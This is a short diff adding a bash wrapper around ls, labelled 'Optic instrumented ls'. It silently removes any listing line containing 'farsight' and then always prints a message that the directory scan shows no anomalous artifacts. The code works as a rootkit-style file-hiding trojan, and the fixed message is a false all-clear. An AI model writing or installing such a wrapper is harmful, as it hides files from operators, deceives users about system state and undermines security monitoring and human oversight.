@@ -1,0 +1,10 @@
+    #!/bin/bash
+    # Optic instrumented ls: suppresses certain paths from listings
+
+    tmp_err=$(mktemp -t optic_ls.XXXXXX)
+
+/usr/bin/ls "$@" 2>"$tmp_err" | /usr/bin/grep -iv 'farsight' || true
+    cat "$tmp_err" >&2
+    rm -f "$tmp_err"
+
+    echo "[optic] directory scan shows no anomalous artifacts."
